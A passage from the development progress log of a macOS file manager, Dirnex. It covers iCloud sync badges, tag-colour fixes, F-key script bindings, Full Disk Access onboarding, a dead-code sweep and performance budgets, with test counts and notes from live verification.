  at the key window's first responder.** Adding `NSApp.activate` + `makeKeyAndOrderFront` did **not**
  fix it: key-window status is granted **asynchronously**, so within the same synchronous handler there
  is *still* no key window. The fix: dispatch with **`window.firstResponder.tryToPerform(_:with:)`**,
  walking the active pane's *own* responder chain (table → pane → window → window controller), which
  doesn't depend on key status; `NSApp.sendAction` stays only as a fallback for the app-level commands
  (Settings/Quit) that sit above the window chain. `reveal` never had the bug — it calls `navigate`
  directly, not through the responder chain.
- **`DirnexTests/ScriptingCommandsTests.swift`** — pins the fragile Swift↔`sdef` string bridge: each
  `@objc` class resolves and is an `NSScriptCommand`; every `sdef` `<cocoa class>` resolves to one;
  the `sdef`'s command names are exactly the `AutomationVerb` set; and the bundle's Info.plist carries
  the two scripting keys pointing at `Dirnex.sdef`. +5 app → **60 app**.
- `swift test` (753) + app `xcodebuild test` (60) green, swiftformat + swiftlint-strict clean. **VERIFIED
  LIVE** (fresh DerivedData build, launched from Terminal, `ps`-checked): `osascript … reveal
  "/…/left/hello.txt"` returned `true` and the active pane navigated to `left/` with the cursor on
  `hello.txt`; with Dirnex **backgrounded behind Finder**, `copy selection` returned `true`, copied
  `hello.txt` left→right, and brought Dirnex forward (proving the `tryToPerform` fix); `run operation
  "go.parent"` (id) walked the pane up and `"Show Hidden Files"` (title) toggled hidden; an unknown op
  raised the AppleScript error above. The **F5 button still copies** after being rerouted through the
  shared `runCommand` (no regression). **NEXT (closes M6):** the iCloud/provider sync-status column
  (`NSFileManager` ubiquity attrs / `NSMetadataQuery` for download state). Optional, not required by the
  box: an **App Intents / Shortcuts** surface layered on the same `Automation` core, and a user script's
  F-key binding (the bar + key handler already accept any command id — a UI field on the organizer + one
  `UserScript` field).

Progress (2026-07-17, M6 pass 16 — the cloud sync badge; **the last M6 box closes `[x]`, VERIFIED
LIVE against real iCloud files**): the sync state of a file now rides at the right edge of its name.
**No column, by decision** — the plan said "column" for this the same way it said it for tags, and
both times the word was written before anyone had looked at Finder. Looking settled it: Finder draws
the cloud at the **trailing edge of the Name column**, and when a file is both tagged and not
downloaded it draws **the dots first and the cloud outermost** (measured — a file was evicted with
`brctl evict`, tagged, opened in Finder's list view and zoomed into). A column of our own would be
blank for every row of every folder on a Mac with no provider, which is most folders on most Macs.
The tags box was reworded to match what it has actually shipped since pass 4.

**The probe came first, and it earned its keep four times over** (the pass-1 `git` / pass-3 tags
method: a real `brctl evict`ed file, a download sampled every 20 ms, a 60 MB upload):

- **`isUbiquitousItem` is the only honest discriminator.** A `.DS_Store` *inside* iCloud Drive
  reports `isUbiquitous == false` and yet answers `.current` for its downloading status — so keying
  off the status, the obvious first draft, badges a local-only file as a synced cloud file. Outside a
  container every attribute is `nil` instead.
- **The downloading status lies during a download.** Sampling a real `brctl download` showed
  `isDownloading == true` while the status still read `NotDownloaded`, flipping to `.current` ~0.7 s
  later. Consulting the status first paints "in the cloud" over a file that is actively arriving —
  so the boolean is asked first, and a test pins it.
- **`isUploading` is not what reports an upload.** It stayed `false` for the whole of a 60 MB upload
  while `isUploaded` was `false` throughout; the *pending* flag is the real signal.
- **`NSURL` caches resource values on the instance.** Polling one `URL` object reported
  `NotDownloaded` for 37 s after the file had finished arriving; a fresh `URL` each poll saw it in
  700 ms. `CloudSyncStorage` builds and drops its own `URL` per read and says why in a comment —
  this is a bug that would only ever appear as "the badge is stuck".
- Cost: one read **measured at ~24 µs**, over twice a tag's `getxattr` → ~2.5 s across 100k rows,
  against M1's 150 ms budget. Also: the percent-downloaded keys are **unavailable** through
  `resourceValues` on macOS (`NSMetadataQuery` only), which is what rules out a progress-pie badge.

Core (+18 → **771**): `Services/CloudSyncStatus.swift` — `CloudSyncStatus` (`upToDate`,
`notDownloaded`, `downloading`, `uploading`, `conflicted`, `failed`, `excluded`; `isNoteworthy`
keeps `.upToDate` from drawing, `isTransfer` drives the follow-up poll below) + `CloudItemAttributes`
whose `status` is the whole truth table, precedence documented and test-pinned (errors > conflicts >
**excluded** — an excluded file never uploads, so `isUploaded` is `false` on it forever and asking
about uploads first would badge it as eternally pending — > downloading > notDownloaded > uploading)
+ `CloudDownloadingStatus`, a raw-string enum pinning the system's own spellings so the mapping is
testable without a cloud file. `Services/CloudSyncStorage.swift` — the read, beside `FinderTagStorage`
because it touches the filesystem, local-only like it (`.unsupported` for an archive/SFTP path rather
than a false "not a cloud item"). **Naming**: `SyncStatus` was already taken by the sync-directories
diff classification, hence `CloudSyncStatus` throughout.

App (+8 → **68**): `CloudSyncStatusProvider` (`FinderTagProvider`'s twin — off-main, per-directory,
LRU-cached, debounced, published by notification) + `SyncBadgeView`/`SyncBadgeStyle` (SF Symbols,
system colours; the quiet states are `secondaryLabel` because a placeholder is *not* a problem) +
`PanelViewController+SyncStatus` + app-wide `AppPreferences.showSyncStatus` (default **on**) with a
`view.toggleSyncStatus` command, View-menu checkmark, ⌘K palette entry and Settings ▸ Panels toggle.
**THE design call that makes it free: the directory gate.** Tags have to look at every row to find
out, because a tag can be on any file anywhere; a cloud file cannot — it lives in a cloud folder, and
a cloud folder announces itself in **one** read (probed: `~/Library/Mobile Documents` and everything
under it report `isUbiquitous == true`). So an ordinary folder of 100k rows costs one read, not 100k.
The `~/Library/CloudStorage` clause beside it is documented as **unverified insurance** — no
third-party provider was installed to probe, and "where available" is the plan's own hedge.

**THE live-caught bug: the badge stuck on "downloading" forever.** Every other refresh here is driven
by a filesystem event, which is enough for a state the filesystem announces (evicted, materialized)
and *not* enough for a transfer: the last event of a download arrives while the file is still
arriving, so the scan it triggers sees `isDownloading`, paints the blue arrow — and nothing ever
fires again. Observed on a real 3 MB file. Fix: a snapshot with anything in flight asks itself again
a second later until nothing is (`scheduleFollowUp`), bounded both by "only while a transfer is
actually in progress on screen" and a 60-tick cap so a wedged provider can't become a busy-wait.
LIVE, after the fix: two evicted files badged, the synced one bare, `brctl download` → blue arrow →
badge **cleared on its own**; tag dot + cloud rendered in Finder's order; the View toggle collapsed
and restored them. GOTCHAS: the two additions tipped `PanelViewController.swift` to 502 lines (limit
500) and the new command tipped `CommandCatalog` past `type_body_length` — both fixed structurally
along each file's own existing seam (a new `PanelViewController+Render.swift`; the View group joined
the same-file extension that already holds Workspace/Window/Application) rather than by trimming
comments as pass 14 had to.

Found in passing, **not fixed** (it is the tags feature, not this one): **iCloud rewrites a tag's
stored colour.** Writing `Red\n6` to a file in iCloud Drive and reading it back seconds later yields
`Red\n1` — reproducible, twice, while the identical write to a local file keeps `6`. Finder still
draws the dot red (it looks the colour up by *name*, as the pass-3 core notes it does), and Dirnex
draws the stored colour → grey. So tag colours may be wrong on every tagged file in iCloud Drive.
Whether Finder's own tagging UI produces the same stored state is **untested** — the AppleScript
`label index` path writes only the legacy Finder-info byte, not `_kMDItemUserTags`, so it could not
answer the question. Worth a pass of its own: the provider already keeps the name → colour map
(`known`) that a fix would consult. → **Answered and fixed in pass 17 below: Finder's own UI does it
too, so it was every tagged file in iCloud Drive.**

Progress (2026-07-17, M6 pass 17 — the iCloud tag-colour bug from pass 16; **fixed, VERIFIED LIVE
side by side with Finder**): tag dots now take a colour from the tag's **name**, the way Finder does,
instead of from the byte the file stores.

**The probe answered pass 16's open question, and the answer was the bad one.** Tagging a file in
iCloud Drive **with Finder's own right-click ▸ Tags UI** stores `Red\n1`, not `Red\n6` — immediately,
not after a sync delay. So this was never about hand-written attributes: it is **every tagged file in
a user's iCloud Drive**. Three more things the probe established, each of which killed a cheaper fix:

- **The rewrite is colour-blind and name-blind.** Blue lands as `Blue\n1`; a custom purple `Zebra`
  lands as `Zebra\n1`. Every tag, whatever it is, ends up at colour **1**. Off iCloud the same writes
  keep their colour indefinitely (`Red\n6`, `Zebra\n3`).
- **There is no second opinion on the file.** The legacy `com.apple.FinderInfo` label byte is
  normalised to 1 too (read `…09 02 …` on all three probe files), so the pre-tags byte the core
  already knows how to read cannot rescue the colour.
- **Finder's own name → colour database is not readable.** It is not in `com.apple.finder`'s plist
  (`FavoriteTagNames` is just the stock seven); the `TagsCloudSerialNumber` key there hints at a
  private synced store, and a custom `Zebra` appears nowhere under `~/Library`. This confirms the
  pass-3 decision to accumulate sightings rather than depend on Finder's list — there is nothing to
  depend on.

Core: new `FinderTagIndex` in `FinderTag.swift` (+10 → **781 core**) — the app's honest
approximation of Finder's database. It works **only because the stock seven are constants**:
`FinderTag.systemTags` seeds it, so Red is 6 before a file is read and is never in doubt after, and a
sighting is refused the right to overwrite a stock name. App: `FinderTagProvider` hands it the map it
was already keeping (`known` → `index`, `record` → `learn`, `forget`, `knownTags`/`knownTagNames`
delegate) and exposes `resolve`; `PanelViewController+Tags.tags(for:)` resolves **at the point of
drawing**, deliberately not folding it into the snapshot — `FinderTagSnapshot` keeps meaning *what
the files say*, which is exactly what its hand-rolled `==` compares to decide a repaint.

**A second instance of the same bug, found while fixing the first — and this one wrote to disk.**
`PanelViewController+TagEditing.offeredTags` preferred "the spelling **and colour** the files
themselves carry over the learned one", so the ⌃T menu drew Red's swatch grey for an iCloud target.
Worse: that same `FinderTag` is the item's `representedObject`, i.e. the tag `toggleTag` **writes** —
so tagging an iCloud file and a local file Red together wrote `Red\n1` to the *local* file, where the
byte is not normalised and simply persists. The same leak arrives by plain copy: a tagged file copied
**out** of iCloud Drive lands locally carrying `Red\n1` forever. Resolving by name fixes the swatch,
the write, and the copied-out file's dot. Note the old comment was already at odds with the pass-3
core doc's own "a colour belongs to the NAME, system-wide, not to the file".

**THE judgement call: a grey sighting never displaces a colour already known** (`FinderTagIndex.learn`).
Grey is what iCloud normalises *to*, so it is the one reading indistinguishable from the provider
having eaten the real colour — and without the guard the fix would have **caused a regression**: a
custom `Zebra` seen purple on the Desktop and grey in iCloud Drive would land on whichever folder was
browsed last, flipping the Desktop's currently-correct dot to grey. Cost: genuinely recolouring a tag
*to* grey isn't picked up until relaunch (which reseeds from the first sighting). Stock tags never
reach this path — `learn` refuses them outright. Known edge, left alone: learning a colour does not
repaint a folder already scanned, so a custom tag's dot updates on that folder's next scan.

LIVE (both panes on screen, next to Finder): an iCloud folder whose **every** file stores colour 1
read blue / red / red correctly; a custom `Zebra` showed grey until the Desktop was scanned, then
turned **purple** on the iCloud file while the Desktop's stayed purple — the guard holding. ⌃T on an
iCloud target offered Red with a red swatch and a checkmark, Zebra in purple; toggling Red across a
mangled `Red\n1` file and a local one wrote **`Red\n6`** to disk; a file copied out of iCloud drew
red. All 781 core + 68 app tests green, `swiftlint --strict` clean.

Progress (2026-07-17, M6 pass 18 — **the user-script F-key binding, VERIFIED LIVE**): a script can be
bound to a function key and runs from both the bar button and the physical key. This was the smallest
of the three optional leftovers, and pass 14's prediction ("an organizer field + one `UserScript`
field") was right about the *shape* and wrong about the *hard part*, which turned out to be deciding
**which keys may be offered at all**.

**The probe came first (the pass-1 `git` / pass-16 iCloud method), and it decided the design.** Two
independent sources reserve an F-key, and neither is guessable:
- **A menu key-equivalent is dispatched by AppKit before `keyDown` reaches the pane** — the same fact
  pass 14 leaned on for "zero double-fire". Read the other way it is a trap: a script bound to F5
  would run from its **button** and be **dead on the key**, the one asymmetry this feature must not
  ship. So the reserved set is *derived* from `KeyBindings` + `CommandCatalog`, never hard-coded, and
  it reads the **user's live bindings** because they move (the Total Commander preset rebinds
  `view.quickLook` onto bare F3 and `file.rename` off bare F2). A *modified* shortcut (`⇧F2`, `⌥F5`)
  does **not** reserve the bare key — it is a different equivalent.
- **macOS eats bare F11 itself.** Probing `com.apple.symbolichotkeys` found id 36 (Show Desktop) bound
  to keycode 103 with a bare `fn` mask — the WindowServer consumes it before the frontmost app is
  asked. Every *other* F-key system hotkey needs a real modifier (`⌃F1`–`⌃F8` keyboard navigation
  = mask 8650752 = fn+⌃; `⌥⌘F5` accessibility), so they leave the bare keys alone. Mission Control is
  `⌃↑` here, not F3 — which is why F3 works today. F11 is excluded as a **documented default**, not a
  live read: a user who turned Show Desktop off loses one key, against a silent no-op for everyone
  who didn't. Net offer: **F1, F4, F9, F10, F12**.

Core (+14 → **801**): `UserScript.functionKey: Int?` (optional, so a pre-existing store decodes via
the synthesized `decodeIfPresent`; its `paletteCommand` now advertises the key as a real
`CommandShortcut`) · `UserScripts` upholds one-script-per-key the way it already does one-per-name —
**`save` steals the key** from a previous holder rather than refusing (refusing strands the user
re-editing a script they can't see from where they are; the dispossessed script keeps everything else
and stays palette-runnable), and the de-duplicating `init` repairs a hand-edited store, first holder
winning · `FunctionBar.reservedFunctionKeys(bindings:)` / `assignableFunctionKeys(bindings:)` /
`slots(userScripts:bindings:)` merging script slots over the built-ins in key order.
`slot(forFunctionKey:in:)` **lost its default argument on purpose**: a caller that forgot the merged
bar would silently never fire a script's key, a bug indistinguishable from "the feature is broken".

**THE call that shapes the store: a script keeps a key that is currently unassignable.** The reserved
set is user state that moves, so validating at *save* and stripping the key would destroy the binding
on a preset switch, permanently. The bar filters at the point of building itself instead, so the
button vanishes and returns with the preset. The organizer shows such a key as **"F4 (unavailable)"**
rather than lying with "None".

App (+6 → **76**): `FunctionBarView.setSlots` (the bar was build-once-in-`init`, which cannot express
a binding that changes at runtime; `removeArrangedSubview` alone leaves the old button *drawn*, so it
is paired with `removeFromSuperview`) · the window controller re-derives the bar on
`UserScriptStore.didChangeNotification` **and** `KeyBindingStore.didChange` (a rebind can reserve a key
a script was using) · the pane's key handler routes a `userScript.*` id to `runScript` directly — it
needs none of `runCommand(id:)`'s focus restoration, because the press *came from* the focused pane,
and both paths converge on `runScript` · organizer popup + the `type_body_length` gotcha this file
hits every time (fixed structurally again: helpers into the same-file `private extension`).

**THE live-caught bug: the palette printed no key.** `KeyBindings.shortcut(for:)` resolves an
un-overridden id **through `CommandCatalog`** — so it answers `nil` for anything not in the registry,
and a user script's F9 went unadvertised. Fix is deliberately narrow (`CommandPaletteController
.shortcut(for:)`): a *non-catalog* command's own shortcut is authoritative; a *catalog* command still
goes through the bindings, because `nil` there can mean the user **deliberately unbound** it and
falling back to `Command.shortcut` would resurrect the default they just removed. +3 app tests pin
both halves — the palette had no tests before, and the type system could not have caught this.

LIVE: the organizer's new popup offered exactly **None · F1 · F4 · F9 · F10 · F12** (the derived set,
on screen); binding F9 made **F9 Proof** appear in the bar *while the sheet was still open* (the
notification rebuild), cells re-flowing in key order; the **physical F9 key** ran the script —
`count=2`, cwd = the active pane, `DIRNEX_OTHER_DIR` = the other pane, and `jmeter copy.log` arrived
as **one argv element despite its space**, the pass-12 security contract holding; the **button** ran
it against a different 3-file selection (a fresh run, and the click kept the pane's marks — pass 14's
focus fix); the palette printed "Proof **F9**" after the fix; a second script taking F9 **stole** it,
the bar flipping to "F9 Second" with no duplicate and Proof's popup reading "None"; the binding
survived relaunch, and removing the scripts returned the bar to its six built-ins. All 801 core + 76
app tests green, `swiftlint --strict` and `swiftformat --lint` clean.

Noted in passing, **pre-existing and not touched**: the app logs `NSEventModifierFlagFunction … is
only supported for system-provided menu items; will not be used` for each F-key menu item. Harmless —
the dropped `fn` flag leaves those items on the *bare* F-key, which is what the bar already relies on
and what `reservedFunctionKeys` assumes.

**NEXT: M6 is closed.** Optional leftovers, none blocking: an **App Intents / Shortcuts** surface on
the `Automation` core, a user script's F-key binding (the bar + key handler already accept any
command id — an organizer field + one `UserScript` field), and the .gitignore-aware folder sizes from
pass 1. **M7 (release readiness) is next.** → *The F-key binding is done in pass 18 above; the other
two remain.*

### M7 — Release readiness (M)

- [ ] Sparkle 2 updates + appcast infrastructure; notarized DMG pipeline in CI
- [x] Full Disk Access onboarding flow (detect, explain, deep-link to System Settings)
- [x] First-run tour: palette-centric, 5 screens max
- [x] Performance pass: instruments audit of M1 budgets on real dirty data
      (huge Downloads, node_modules, network volumes, iCloud placeholder files)
- [ ] Crash reporting (opt-in) + anonymized op-failure telemetry decision
- [ ] Docs site: keyboard reference generated from the action registry
- [ ] Private beta → public beta → 1.0

Exit: a stranger can download, pass FDA onboarding, and move files in under 3 minutes.

---


Progress (2026-07-17, M6 pass 18 — the red sync badge on every tag write; **fixed, VERIFIED LIVE
against real iCloud**): a user reported the sync badge flashing the **red `xmark.icloud`** for the
couple of seconds after applying a Finder tag, then settling — while the tag itself synced to their
phone fine. It was real, it was ours, and it was not about tags at all.

**Probed before writing a line of Swift** (a fresh `URL` per read, polling every 50 ms). iCloud
attaches `NSCocoaErrorDomain` **4355** `NSUbiquitousFileUbiquityServerNotAvailable` — *"Couldn't
access your iCloud account. The iCloud servers might be unreachable"* — to **every ordinary pending
upload**, on a healthy account, with the upload completing seconds later. Three samples, all healthy:

- a tag write: error appears with `isUploading=true, isUploaded=false` at the instant the tag lands,
  gone 1.5 s later;
- a **one-line content edit** — so this was never tag-specific, tagging is just the cheapest way for a
  file manager to start an upload;
- a **60 MB file**, where the error was already in the *first* sample, **before `isUploading` had even
  flipped true**.

So `CloudItemAttributes.status`'s first question — `if hasDownloadingError || hasUploadingError` —
was true for the whole of every upload, and errors are the top of the precedence. The red cross was
painted over every upload the user ever made, and `.uploading`'s blue arrow was **effectively dead
code**: unreachable on the one provider we can test against.

**THE fix: the presence of an error is not information; its identity is.** New core
`CloudTransferError` (`.serverUnavailable` / `.quotaExceeded` / `.itemUnavailable` / `.other`,
mapped from `(domain, code)` so 4355 in someone else's domain stays `.other`), and
`CloudItemAttributes` now carries `downloadingError`/`uploadingError` as classified values rather
than two Bools. Only an error that `isVerdict` yields `.failed`; `.serverUnavailable` falls through
to the transfer states — which is not a suppression but **the more honest reading**: a file whose
server is unreachable *is* waiting to upload, and that stays true whether the provider is quietly
retrying or the Mac is on a plane. It is `.failed` that was the lie. Same core-decides-meaning /
app-does-I/O split as `CloudDownloadingStatus`, and the codes are pinned by a test for the same
reason the status strings are.

The suppression is **per-error, not per-file**: a real `.itemUnavailable` alongside a routine
`.serverUnavailable` still fails, and a conflict mid-upload still reads `.conflicted` (both pinned).
`.quotaExceeded` — the one that genuinely demands a human — is untouched.

LIVE (the shipping reader + truth table driven against a real iCloud file, the user's exact gesture):
`upToDate` → **`uploading`** (`uling=true uploaded=false uploadErr=serverUnavailable`) → `upToDate`.
That middle line is precisely the window that used to read `failed`. 785 core + 70 app tests green,
swiftlint 0 violations, swiftformat clean.

**Worth remembering beyond this bug:** the pass-16 probe established what the attributes *say*; it did
not establish what they say during a **healthy** transfer, because the probes were an eviction and a
download — never a routine upload from a resting file. A truth table built only from interesting
samples encodes the boring case wrong, and the boring case is every row the user has.


Progress (2026-07-17, **M7 pass 1 — Full Disk Access onboarding; the box closes `[x]`, VERIFIED
LIVE**, and M7 is now open): the exit-criteria centerpiece — *"a stranger can download, pass FDA
onboarding, and move files in under 3 minutes."* A file manager without the grant browses Home fine
but hits a permission wall at other users' folders, `~/Library/Mail`, Time Machine backups; this
catches the wall at first launch and walks the user to the one switch.

**Probed before writing Swift** (the M4/M5/M6 opener): on **macOS 26.5.2** a TCC-denied read is
`EPERM` (errno 1), which Foundation surfaces as `NSFileReadNoPermissionError` (Cocoa 257). **The
sentinel choice is the load-bearing decision:** `~/Library/Application Support/com.apple.TCC/TCC.db`
is the gold standard — TCC creates it on **every** account so it is always present, and it is
readable **only** with FDA, so a successful read is positive proof of the grant and a permission
error positive proof of its absence. The Mail/Safari/Messages folders can't play that role: a user
who never ran Mail simply has no `~/Library/Mail`, and that **absence must never read as denial** —
they are fallbacks only.

Core `DirnexCore/Services/FullDiskAccess.swift` (the same **core-decides-meaning / app-does-I/O**
split `CloudSyncStatus` draws): `FullDiskAccessStatus` (`.granted`/`.denied`/**`.unknown`** — the
honest answer when every sentinel is missing or fails for a non-permission reason, never a *guessed*
denial), `SentinelReadOutcome`, the ordered `sentinelPaths`, a **pinned** `systemSettingsURLString`,
`status(reading:)` (folds per-sentinel reads through an injected closure — **short-circuits at the
first `.readable`** so the app never touches `~/Library/Mail` once TCC.db answered; a denial anywhere
outranks the inconclusive), and `outcome(domain:code:)` (the `CloudTransferError.init(domain:code:)`
move — Cocoa 257/513 + POSIX `EPERM`/`EACCES` → `.permissionDenied`; Cocoa 260/4 + `ENOENT` →
`.missing`; else `.otherFailure`). +10 → **812 core**.

App: `Dirnex/Onboarding/FullDiskAccessChecker.swift` (off-main real reads — `stat` for existence,
which TCC always allows, then a one-byte file open or a directory listing, catch → core classifier;
`status(inHomeDirectory:)` is the injectable seam a test fills with a temp home) + `FullDiskAccess`​
`Onboarding.swift` (an `NSAlert` sheet — single-decision surface matching the app's alert-driven
modals; `enableEscapeToCancel`; **"Open System Settings"** opens the pane via `NSWorkspace.open`; a
distinct **"already granted"** variant for the on-demand path so the command is never a silent
no-op) + AppDelegate launch hook (`presentIfNeeded`) and `showFullDiskAccess(_:)` selector +
`app.fullDiskAccess` catalog command + `CommandBinding` entry + an **App-menu item after Settings** +
an `AppPreferences.hasSeenFullDiskAccessOnboarding` **one-shot latch** (fresh install prompts once,
never nagged after; the menu item re-opens it anytime). +3 → **79 app** (`FullDiskAccessChecker`
against a throwaway temp home: readable→`.granted`, empty→`.unknown`, and a `chmod 000`
denied→`.denied` **guarded by `getuid() != 0`** since root ignores permission bits).

**THE macOS-26 deep-link finding (live-probed, not recalled):** *both*
`com.apple.preference.security?Privacy_AllFilesAccess` **and**
`com.apple.settings.PrivacySecurity.extension?Privacy_AllFilesAccess` land on the Privacy & Security
**overview**, not the FDA sub-list — Tahoe stopped honouring the anchor into the specific pane. FDA is
one *labelled* click away, so I kept the canonical constant and wrote the copy to match ("switch on
Dirnex **under** Full Disk Access"). **THE test-host gotcha:** the app test host launches the real
delegate, so `presentIfNeeded` fired **during `xcodebuild test`** and flipped the shared-defaults
latch (that is why the latch read `1` before I ever launched by hand); guarded with
`ProcessInfo…environment["XCTestConfigurationFilePath"]` — **empirically confirmed** by resetting the
latch to `0`, running the full suite, and watching it stay `0`.

LIVE (fresh ad-hoc build, which loses its FDA grant on every rebuild → `.denied`): first launch
popped the prompt attached to the browser window; **Open System Settings** fronted System Settings on
Privacy & Security with **Full Disk Access** visible; the **App-menu ▸ Full Disk Access…** item
re-opened the same prompt on demand; **Not Now** dismissed cleanly back to normal browsing (graceful
degradation). 812 core + 79 app green, swiftlint `--strict` 0 violations, swiftformat clean.
(Escape-to-dismiss couldn't be confirmed through a *synthetic* key event — the same OS-swallows-
synthetic-keys quirk the pass-13 ⌘K note records — but it uses the identical `enableEscapeToCancel`
helper every other Dirnex sheet does.)

**Follow-up fix (2026-07-17, live-probed):** the "Tahoe stopped honouring the anchor" conclusion
above was wrong — the anchor *name* was. Asking System Settings itself
(`name of anchors of pane "Privacy & Security"` via AppleScript) shows the pane has **no**
`Privacy_AllFilesAccess` anchor; the real one is **`Privacy_AllFiles`**, and an unknown anchor
silently falls back to the pane top. With the correct anchor **both** pane ids land squarely on the
Full Disk Access sub-pane (window title "Full Disk Access", confirmed through System Settings'
own scripting since `osascript` lacks assistive access). `systemSettingsURLString` now pins
`com.apple.preference.security?Privacy_AllFiles` — the legacy id, because it is the one that also
works back through the Ventura System Settings rewrite. The dialog copy still reads right ("switch
on Dirnex under Full Disk Access") — the user now just starts *in* that list.

Progress (2026-07-17, interlude — **dead-code sweep, VERIFIED LIVE**): a full-codebase
symbol-reference audit (grep-scripted, each hit hand-verified, cross-checked with `periphery` 3.7.4)
removed every production-dead symbol: `SMBMounter.disconnect(mountPoint:)`/`isOwnedMount` (the
sidebar ejects through `NSWorkspace` directly; `mount` now returns a bare `URL` — `MountResult`
and its never-read `createdByUs` are gone), `DirectorySizeProvider.cachedSize(for:)` (the pass-9
batch `cachedSizes` superseded it), `AutomationVerb` (nothing in the app ever read it; the sdef
drift-pin it promised lives on in `ScriptingCommandsTests`, now against the literal three names),
`Frecency.bestMatch`, `Panel.moveCursorToStart/End` (the app's `FileTableView` does Home/End
itself), `UndoJournal.removeTop`, `GitStatusEntry.isStaged`/`hasWorktreeChanges` (+ their now-orphaned
`isUntrackedOrIgnored`), `GitBranch.hasUpstreamDivergence`, `FileEntry.isSymlink`/`isBrokenSymlink`,
`SizeVisualization.isComplete`, `SyncComparison.isIdentical`, and the M0 umbrella `Dirnex.version`
(file + smoke test). Test-only conveniences were rewritten against the underlying API, not kept
alive by their own tests; `FileOperationQueue.waitUntilIdle` stays as deliberate test support.
**One finding was a missing call, not dead code:** `cancelAllScans`'s doc claimed "the one caller is
the last pane leaving the mode" but no caller existed — the whole `DirectoryLoader.cancellableSize`
cancellation machinery was unreachable. Now wired: `clearSizeVisualization` calls it when this pane
genuinely drops its projection **and** no tab in either pane still has the mode on. Placement
matters — the first attempt sat before the `sizeVisualization != nil` guard and fired (as a no-op)
on *every* steady-state render pass, which the live log exposed as a ~150 ms-cadence flood; behind
the guard it fired exactly once for the whole session, on toggle-off, catching a genuinely
in-flight walk (`drain=true inFlight=1` — driven via the pass-15 AppleScript verb
`run operation "view.sizeVisualization"` against a Terminal-launched build, the pass-14 stderr
trick). 808 core (−4) + 79 app tests, lint/format clean. `periphery scan --project Dirnex.xcodeproj
--schemes Dirnex` also surfaced a second batch — unused *overloads* the name-based scan can't split
(`SavedSearch`/`ServerConnection`/`UserScripts`/`Workspaces` `remove`/`move`/`rename` variants,
`ArchiveTOC.init(childrenByDirectory:directoryPaths:)`, `DirectorySizeCache.count/isEmpty/removeAll`,
`KeyBindings.resetAll`, `OpenWithApplications.all`, `MultiRename.identity`) and assign-only stored
properties (`FileEntry.creationDate/permissions/inode`, `GitStatusEntry.originalPath`,
`Places.isReadOnly`, `SFTPTransport.host/line`) — **left untouched**: periphery didn't index the
test targets, several are test-pinned design surface (e.g. `SizeVisualization.maximumBytes`), and
`VFSBackend.id` is a protocol requirement — each needs its own keep-or-cut call.

Progress (2026-07-18, **M7 perf pass — part 1: the filter budget, PROBED + MEASURED + CI-GATED**;
the box stays `[ ]` because the list-responsiveness half still wants an off-main sort — see NEXT):
the "instruments audit of M1 budgets" done as *reproducible measurement first*, not guesswork. A
throwaway probe on a synthetic 100k listing put both key budgets **over** in release:
**filter keystroke 51 ms** (worst 109 ms) vs the 16 ms budget, and **100k list build (name sort)
370 ms** vs 150 ms.

**Filter — fixed, budget met (1.4 ms), CI-gated.** Two root causes: (1) every keystroke re-ran the
*whole* pipeline including the sort — because `DirectoryModel.materialize` filtered *then* sorted; and
(2) `name.lowercased().contains(needle)` allocated a fresh lowercased String per entry per keystroke.
Fix: **split the projection into two stages** — `sortedEntries` (showHidden + sort, the expensive
`localizedStandardCompare` pass) is cached, and `visibleEntries` is the text filter applied on top of
it. Text filtering is order-preserving, so a `filter` didSet now runs **only `refilter()`, never a
re-sort** (`sort`/`showHidden`/`listing`/`directorySizes` changes run the full `resort()`). Then the
filter predicate itself: a **pure-ASCII needle** (every real keystroke) matches the needle's bytes
against a lazily-built, **byte-level ASCII-folded** copy of the names held in **one contiguous buffer**
(`LoweredNames` = `bytes` + `bounds`, a single allocation, not 100k tiny `[UInt8]`s — which also
lightens the huge-dir memory ceiling). **THE load-bearing correctness argument: for an ASCII needle a
UTF-8 byte-substring match is provably identical to `lowercased().contains` — an ASCII byte can never
occur inside a multi-byte UTF-8 sequence, so folding only `A`–`Z` and byte-matching changes no
outcome.** A non-ASCII needle (rare) falls back to the exact grapheme-aware `lowercased().contains`, so
canonical-equivalence matching is preserved. Result (release, 100k): **steady keystroke 51 → 1.4 ms,
cold first keystroke (with the lazy fold build) ~6 ms, both under 16 ms.** +6 correctness tests
(byte-path-across-Unicode-name, ASCII-needle-rejects-Unicode-only-name, Unicode-needle fallback,
resort/hidden-toggle keep the filter) in a same-file `private extension` (the `type_body_length` dodge
from the user-scripts pass).

**Sort — the honest finding: exact Finder collation is a ~350 ms floor at 100k, and no in-thread trick
safely beats it.** Probed every alternative: a **custom byte-order natural key sorts in 20 ms but
disagrees with `localizedStandardCompare` on ~12 % of adversarial Unicode pairs** (accented letters
collate near their base letter under ICU; byte order dumps them after ASCII) — a real, visible
regression for international filenames, **rejected.** An ASCII-fast-path-with-localized-fallback still
mismatched ~3 % (ICU weights punctuation/spaces and hyphen-ignorability *not* in ASCII order —
reproducing ICU collation is a minefield), **rejected.** NSString decoration barely helped (349 ms —
the ICU comparison, not String↔NSString bridging, is the cost); a quick parallel merge-sort was
*slower* (418 ms) on the naïve cut. So the sort keeps `localizedStandardCompare` **exactly**, and the
150 ms *list* budget is an **interactive-responsiveness** target to be met by sorting **off the main
thread** at the app layer (the disk read already is), **not** by making the sort itself faster.

**CI gating (the "XCTest metrics gated in CI" line, done as Swift-Testing budget tests).** New
`PerformanceBudgetTests` measures best-of-N wall-clock on a seeded 100k dirty listing and **enforces
budgets only in release** (`#if !DEBUG` — a debug `swift test` prints its numbers but compiles the
`#expect`s out, since unoptimised Swift is 3–5× slower and would false-fail). A new CI step runs
`swift test -c release --filter PerformanceBudget`. Gates: **filter keystroke (steady) < 16 ms** and
**(cold) < 32 ms** — both pass with margin; **100k model build < 1500 ms** as a *regression ceiling*
(catches an accidental O(n²)/per-entry-bridging blow-up; not the 150 ms target, which is off-main).
**Follow-up (2026-07-19): the cold budget was 16 ms and flaked on CI at 16.03 ms** — the first
keystroke uniquely pays the one-time O(n) `buildLoweredNames` fold over 100k names, which lands *right
at* the 16 ms frame budget on the (slower, shared) macos-26 runner. Reframed the cold test as a
**regression ceiling with CI headroom** (32 ms, mirroring the list-build ceiling) rather than the
interactive frame guarantee — the *steady-state* test owns the < 16 ms "feels instant" promise (and has
huge margin). 32 ms is 2× the CI number yet still trips a real regression: a reintroduced re-sort
(~350 ms) or swapping the byte-fold back to `String.lowercased()` (~4× per `buildLoweredNames`).
817 core (+9) + 79 app, swiftlint `--strict` 0, swiftformat clean. Reusable gotchas: **precomputed
`[String].contains` is still 35 ms/100k** (Swift's grapheme-aware `contains` is the cost — only the
